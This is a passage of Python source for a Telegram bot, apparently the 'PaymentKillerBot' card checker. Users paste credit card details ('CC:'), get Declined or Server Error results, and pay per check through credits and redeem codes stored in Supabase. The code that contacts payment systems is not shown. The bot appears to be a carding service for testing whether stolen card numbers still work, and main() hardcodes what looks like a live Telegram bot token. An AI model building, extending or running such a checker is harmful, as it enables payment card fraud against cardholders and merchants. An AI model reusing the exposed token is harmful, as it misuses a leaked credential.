                                f"Delay : *{escaped_delay}s*\n"
                                f"Checked on: [{escaped_bot_name}](https://t.me/PaymentKillerBot)"
                            )

                        elif status_type == "Declined":
                            # Modified for Declined: No details, just "Declined ❌"
                            result_message = (
                                f"CC: `{escape_markdown(original_card_info, version=2)}`\n"
                                f"Status: *{escape_markdown('Declined ❌', version=2)}*" 
                            )
                        else: # Server Error or any other unexpected status
                            # Modified for Server Error: Uses the 'reason' from check_card
                            result_message = (
                                f"CC: `{escape_markdown(original_card_info, version=2)}`\n"
                                f"Status: *{escape_markdown('Server Error ❌', version=2)}*\n"
                                f"Details: {reason}"
                            )

                        if checking_message:
                            try:
                                await checking_message.edit_text(result_message, parse_mode='MarkdownV2')
                            except Exception as e:
                                print(f"ERROR: Failed to EDIT 'Checking card' message. Raw message: {result_message}. Error: {e}")
                                await update.message.reply_text(escape_markdown("Failed to update status message\\. See below for result\\.", version=2), parse_mode='MarkdownV2')
                                await update.message.reply_text(result_message, parse_mode='MarkdownV2')
                        else:
                            await update.message.reply_text(result_message, parse_mode='MarkdownV2')

                        # Deduct credits if the user (including owner) has them.
                        if current_credits > 0: 
                            current_credits -= 1
                            success_deduct = await update_user_credits_in_supabase(user_id, current_credits)
                            if not success_deduct:
                                await update.message.reply_text(f"*{escape_markdown('Error deducting credit from database. Please contact support.', version=2)}*", parse_mode='MarkdownV2')

                        # No message when credits are simply reduced.
                        # Only message if non-owner tries to check with insufficient credits (handled above before loop)
                        # or if an owner checks with 0 credits (no deduction, but still works).

                        time.sleep(1)
                    else:
                        # This 'else' block would only be hit if somehow the initial credit check failed,
                        # or if a race condition occurred. It serves as a final safeguard.
                        await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
                        await update.message.reply_text(
                            f"❌ *{escape_markdown('You do not have enough credits', version=2)}* to check this card\\. Please redeem a code or contact an admin\\." +
                            f"\n\n⚠️ *{escape_markdown('Please add more credits to continue', version=2)}*", 
                            reply_markup=reply_markup,
                            parse_mode='MarkdownV2'
                        )
                        return
            finally:
                context.chat_data['is_checking_cards'] = False
            return # IMPORTANT: Return after processing card inputs

    # SECOND: If not card input, check if it's a single line redeem code
    if len(input_lines) == 1:
        # Changed regex to require "PK" prefix for redeem codes
        redeem_match = re.fullmatch(r"PK[0-9A-Z]{5}", input_lines[0]) 
        if redeem_match:
            await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
            code = input_lines[0]
            credits_to_add = await load_redeem_code_from_supabase(code)

            if credits_to_add is not None:
                current_credits = await get_user_credits_from_supabase(user_id)

                success_update_or_create = await update_user_credits_in_supabase(user_id, current_credits + credits_to_add)

                if not success_update_or_create:
                    await update.message.reply_text(
                        f"❌ *{escape_markdown('Error updating user credits in database. Please try again or contact support.', version=2)}*",
                        parse_mode='MarkdownV2'
                    )
                    print(f"DEBUG: Failed to UPDATE/CREATE user {user_id} credits.")
                    return

                updated_credits = current_credits + credits_to_add

                delete_success = await delete_redeem_code_from_supabase(code)
                if not delete_success:
                    print(f"WARNING: Failed to delete redeem code {code} after successful redemption.")
                    pass

                credits_added_word = "credit" if credits_to_add == 1 else "credits"
                current_credits_word = "credit" if updated_credits == 1 else "credits"

                raw_success_message = f"🎉 Successfully redeemed {credits_to_add} {credits_added_word}!\nYou now have {updated_credits} {current_credits_word}."

                escaped_success_message_content = escape_markdown(raw_success_message, version=2)
                final_display_message = f"*{escaped_success_message_content}*"

                try:
                    await update.message.reply_text(final_display_message, parse_mode='MarkdownV2')
                except Exception as e:
                    print(f"ERROR: Failed to send redeem success message. Error: {e}")
                    await update.message.reply_text(escape_markdown("Redemption successful, but failed to send confirmation message\\. Check your profile for updated credits\\.", version=2), parse_mode='MarkdownV2')

            else:
                await update.message.reply_text(f"❌ *{escape_markdown('Invalid or already used redeem code', version=2)}*\\.", parse_mode='MarkdownV2')
            return # IMPORTANT: Return after processing redeem code

    # If none of the above, it's unrecognized input
    await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)

    error_message_content = escape_markdown("I didn't understand that command.", version=2)

    await update.message.reply_text(
        f"*{error_message_content}*",
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )


def main():
    TOKEN = "7619525840:AAGzU6-66FKlYYJRN1ZulYC48HRbS5Uk11s"
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("credit", generate_redeem_start, filters=filters.User(OWNER_IDS))],
        states={
            GENERATE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_redeem_amount)],
            GENERATE_CREDITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_redeem_credits)],
        },
        fallbacks=[CommandHandler("cancel", cancel_generation)],
    )

    application.add_handler(conv_handler)

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("nocredit", nocredit_command, filters=filters.User(OWNER_IDS)))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot started. Listening for messages...")
    application.run_polling(poll_interval=3)

if __name__ == "__main__":
    main()